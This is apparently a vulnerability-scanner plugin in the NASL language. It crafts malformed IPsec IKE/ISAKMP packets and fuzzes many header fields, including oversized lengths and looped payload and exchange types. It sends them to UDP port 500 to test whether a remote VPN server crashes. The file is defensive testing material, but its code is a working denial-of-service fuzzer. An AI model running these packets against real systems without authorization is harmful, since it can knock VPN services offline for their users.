if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10941" );
	script_version( "2021-06-28T13:30:21+0000" );
	script_tag( name: "last_modification", value: "2021-06-28 13:30:21 +0000 (Mon, 28 Jun 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "IPSEC IKE check" );
	script_category( ACT_KILL_HOST );
	script_copyright( "Copyright (C) 2002 John Lampe" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_ike_isakmp_udp_detect.sc" );
	script_require_udp_ports( "Services/udp/isakmp", 500 );
	script_mandatory_keys( "ike/udp/detected" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "summary", value: "The remote IPSEC server seems to have a problem negotiating
  bogus IKE requests." );
	script_tag( name: "impact", value: "An attacker may use this flaw to disable your VPN remotely." );
	script_tag( name: "solution", value: "Contact your vendor for a patch.

  Reference : See RFC 2409" );
	script_tag( name: "qod_type", value: "remote_probe" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("port_service_func.inc.sc");
srcaddr = this_host();
dstaddr = get_host_ip();
srcport = 500;
dstport = service_get_port( default: 500, proto: "isakmp", ipproto: "udp" );
func bada_bing( blat ){
	UDP_LEN = strlen( blat ) + 8;
	ip = forge_ip_packet( ip_v: 4, ip_hl: 5, ip_tos: 0, ip_len: 20, ip_id: 0xFEAF, ip_p: IPPROTO_UDP, ip_ttl: 255, ip_off: 0, ip_src: srcaddr, ip_dst: dstaddr );
	udpip = forge_udp_packet( ip: ip, uh_sport: srcport, uh_dport: dstport, uh_ulen: UDP_LEN, data: blat );
	result_suc = send_packet( packet: udpip, pcap_active: FALSE );
}
IC = raw_string( 0xFF, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC, 0x03 );
RC = raw_string( 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 );
NP = raw_string( 0x01 );
MV = raw_string( 0x10 );
ET = raw_string( 0x04 );
IF = raw_string( 0x00 );
MI = raw_string( 0x00, 0x00, 0x00, 0x00 );
LEN = raw_string( 0x00, 0x00, 0x01, 0x7b );
ISAKMP_HEADER = IC + RC + NP + MV + ET + IF + MI + LEN;
SA_NP = raw_string( 0x04 );
RES = raw_string( 0x00 );
PLEN = raw_string( 0x00, 0x80 );
DOI = raw_string( 0x00, 0x00, 0x00, 0x01 );
SIT = raw_string( 0x00, 0x00, 0x00, 0x01 );
SA_HEADER = SA_NP + RES + PLEN + DOI + SIT;
P_NP = raw_string( 0x00 );
P_RES = raw_string( 0x00 );
P_PLEN = raw_string( 0x00, 0x74 );
P_NUM = raw_string( 0x01 );
PID = raw_string( 0x01 );
SPI_SZ = raw_string( 0x00 );
TOT_T_NUM = raw_string( 0x08 );
PROP_HEADER = P_NP + P_RES + P_PLEN + P_NUM + PID + SPI_SZ + TOT_T_NUM;
T_NP = raw_string( 0x03 );
T_RES = raw_string( 0x00 );
T_PLEN = raw_string( 0x00, 0x24 );
T_NUM = raw_string( 0x01 );
T_ID = raw_string( 0x01 );
T_RES2 = raw_string( 0x00, 0x00 );
T_FLAGS = raw_string( 0x80 );
T_AC = raw_string( 0x01 );
T_AV = raw_string( 0x00, 0x05 );
T_FLAGS2 = raw_string( 0x80 );
T_AC2 = raw_string( 0x02 );
T_AV2 = raw_string( 0x00, 0x02 );
T_FLAGS3 = raw_string( 0x80 );
T_AC3 = raw_string( 0x04 );
T_AV3 = raw_string( 0x00, 0x02 );
T_FLAGS4 = raw_string( 0x80 );
T_AC4 = raw_string( 0x03 );
T_AV4 = raw_string( 0xFD, 0xE9 );
T_FLAGS5 = raw_string( 0x80 );
T_AC5 = raw_string( 0x0b );
T_AV5 = raw_string( 0x00, 0x01 );
T_FLAGS6 = raw_string( 0x00 );
T_AC6 = raw_string( 0x0c );
T_ALEN = raw_string( 0x00, 0x04 );
T_AV6 = raw_string( 0x00, 0x20, 0xC4, 0x9B );
T_PAY1 = T_NP + T_RES + T_PLEN + T_NUM + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2 + T_FLAGS3 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 + T_ALEN + T_AV6;
T_PAY2 = T_NP + T_RES + T_PLEN + raw_string( 0x02 ) + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2 + T_FLAGS3 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 + T_ALEN + T_AV6;
T_PAY3 = raw_string( 0x00 ) + T_RES + T_PLEN + raw_string( 0x03 ) + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2 + T_FLAGS3 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 + T_ALEN + T_AV6;
KE_NP = raw_string( 0x0a );
KE_RES = raw_string( 0x00 );
KE_PLEN = raw_string( 0x00, 0x88 );
chit = "";
for(i = 0;i < 132;i++){
	chit = chit + raw_string( i );
}
KE_PAY = KE_NP + KE_RES + KE_PLEN + chit;
NON_NP = raw_string( 0xa4 );
NON_RES = raw_string( 0x00 );
NON_PLEN = raw_string( 0x00, 0x56 );
TEST = "";
for(i = 0;i < 83;i++){
	TEST = TEST + raw_string( i );
}
NON_PAY = NON_NP + NON_RES + NON_PLEN + TEST;
func calc_data(  ){
	ISAKMP_HEADER = IC + RC + NP + MV + ET + IF + MI + LEN;
	SA_HEADER = SA_NP + RES + PLEN + DOI + SIT;
	PROP_HEADER = P_NP + P_RES + P_PLEN + P_NUM + PID + SPI_SZ + TOT_T_NUM;
	T_PAY1 = T_NP + T_RES + T_PLEN + T_NUM + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2 + T_FLAGS3 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 + T_ALEN + T_AV6;
	T_PAY2 = T_NP + T_RES + T_PLEN + raw_string( 0x02 ) + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2 + T_FLAGS3 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 + T_ALEN + T_AV6;
	T_PAY3 = raw_string( 0x00 ) + T_RES + T_PLEN + raw_string( 0x03 ) + T_ID + T_RES2 + T_FLAGS + T_AC + T_AV + T_FLAGS2 + T_AC2 + T_AV2 + T_FLAGS3 + T_AC3 + T_AV3 + T_FLAGS4 + T_AC4 + T_AV4 + T_FLAGS5 + T_AC5 + T_AV5 + T_FLAGS6 + T_AC6 + T_ALEN + T_AV6;
	KE_PAY = KE_NP + KE_RES + KE_PLEN + chit;
	NON_PAY = NON_NP + NON_RES + NON_PLEN + TEST;
	blap = ISAKMP_HEADER + SA_HEADER + PROP_HEADER + T_PAY1 + T_PAY2 + T_PAY3 + KE_PAY + NON_PAY;
	return ( blap );
}
stored = MV;
stored2 = ET;
ET = raw_string( 0x01 );
MV = raw_string( 0xFF );
blat = calc_data();
oneoff = strlen( blat );
ip = forge_ip_packet( ip_v: 4, ip_hl: 5, ip_tos: 0, ip_len: 20, ip_id: 0xABBA, ip_p: IPPROTO_UDP, ip_ttl: 255, ip_off: 0, ip_src: this_host(), ip_dst: get_host_ip() );
udpip = forge_udp_packet( ip: ip, uh_sport: 500, uh_dport: 500, uh_ulen: oneoff + 8, data: blat );
filter = NASLString( "udp and src host ", get_host_ip(), " and dst host ", this_host(), " and dst port 500 and src port 500" );
live = send_packet( packet: udpip, pcap_active: TRUE, pcap_filter: filter );
foo = strlen( live );
if(foo < 20){
	exit( 0 );
}
MV = stored;
ET = stored2;
start_denial();
stored = LEN;
LEN = raw_string( 0xFF, 0xFF, 0xFF, 0xFF );
IC = raw_string( 0xFF, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC, 0x03 );
blat = calc_data();
bada_bing( blat );
LEN = stored;
stored = SA_NP;
for(mu = 0;mu < 14;mu++){
	SA_NP = raw_string( mu );
	IC = raw_string( 0x01, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC ) + raw_string( mu );
	blat = calc_data();
	bada_bing( blat );
}
SA_NP = stored;
stored = RES;
for(mu = 0;mu < 128;mu = mu + 16){
	RES = raw_string( mu );
	IC = raw_string( 0x02, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC ) + raw_string( mu );
	blat = calc_data();
	bada_bing( blat );
}
RES = stored;
stored = PLEN;
for(mu = 0;mu < 255;mu = mu + 16){
	for(delta = 0;delta < 255;delta = delta + 16){
		PLEN = raw_string( mu ) + raw_string( delta );
		blat = calc_data();
		IC = raw_string( 0x03, 0x00, 0xFE, 0x01, 0xFD, 0x12 ) + raw_string( delta ) + raw_string( mu );
		bada_bing( blat );
	}
}
PLEN = stored;
stored = SIT;
for(mu = 2;mu < 255;mu = mu * mu){
	for(delta = 2;delta < 255;delta = delta * delta){
		for(sigma = 2;sigma < 255;sigma = sigma * sigma){
			for(gamma = 2;gamma < 255;gamma = gamma * gamma){
				IC = raw_string( 0x04, 0x00, 0xFE, 0x01, 0xFD ) + raw_string( gamma ) + raw_string( delta ) + raw_string( mu );
				SIT = raw_string( mu ) + raw_string( delta ) + raw_string( sigma ) + raw_string( gamma );
				blat = calc_data();
				bada_bing( blat );
			}
		}
	}
}
SIT = stored;
stored = P_NP;
for(mu = 0;mu < 128;mu++){
	P_NP = raw_string( mu );
	IC = raw_string( 0x05, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC ) + raw_string( mu );
	blat = calc_data();
	bada_bing( blat );
}
P_NP = stored;
stored = IC;
IC = raw_string( 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 );
blat = calc_data();
bada_bing( blat );
IC = stored;
stored = IC;
stored2 = RC;
IC = raw_string( 0x56, 0x99, 0xee, 0xff, 0x43, 0x83, 0x87, 0x73 );
RC = raw_string( 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11 );
blat = calc_data();
bada_bing( blat );
IC = stored;
RC = stored2;
stored = MV;
MV = raw_string( 0x00 );
IC = raw_string( 0x06, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC, 0x0D );
blat = calc_data();
bada_bing( blat );
MV = stored;
stored = ET;
for(mu = 0;mu < 255;mu++){
	ET = raw_string( mu );
	IC = raw_string( 0x07, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC ) + raw_string( mu );
	blat = calc_data();
	bada_bing( blat );
}
ET = stored;
stored = PID;
for(mu = 0;mu < 128;mu++){
	PID = raw_string( mu );
	IC = raw_string( 0x08, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC ) + raw_string( mu );
	blat = calc_data();
	bada_bing( blat );
}
PID = stored;
stored = SPI_SZ;
for(mu = 0;mu < 128;mu++){
	SPI_SZ = raw_string( mu );
	IC = raw_string( 0x09, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC ) + raw_string( mu );
	blat = calc_data();
	bada_bing( blat );
}
SPI_SZ = stored;
stored = KE_NP;
for(mu = 0;mu < 128;mu++){
	KE_NP = raw_string( mu );
	IC = raw_string( 0x0A, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC ) + raw_string( mu );
	blat = calc_data();
	bada_bing( blat );
}
KE_NP = stored;
stored = NON_NP;
for(mu = 0;mu < 128;mu++){
	NON_NP = raw_string( mu );
	IC = raw_string( 0x0B, 0x00, 0xFE, 0x01, 0xFD, 0x12, 0xFC ) + raw_string( mu );
	blat = calc_data();
	bada_bing( blat );
}
NON_NP = stored;
alive = end_denial();
if(!alive){
	security_message( port: 500, protocol: "udp" );
}
ip = forge_ip_packet( ip_v: 4, ip_hl: 5, ip_tos: 0, ip_len: 20, ip_id: 0xABBA, ip_p: IPPROTO_UDP, ip_ttl: 255, ip_off: 0, ip_src: this_host(), ip_dst: get_host_ip() );
udpip = forge_udp_packet( ip: ip, uh_sport: 500, uh_dport: 500, uh_ulen: 8 );
filter = NASLString( "icmp and src host ", get_host_ip(), " and dst host ", this_host() );
live = send_packet( packet: udpip, pcap_active: TRUE, pcap_filter: filter );
if(live){
	protocol_type = get_ip_element( ip: live, element: "ip_p" );
	if(protocol_type == IPPROTO_ICMP){
		security_message( port: 500, protocol: "udp" );
	}
}
exit( 0 );

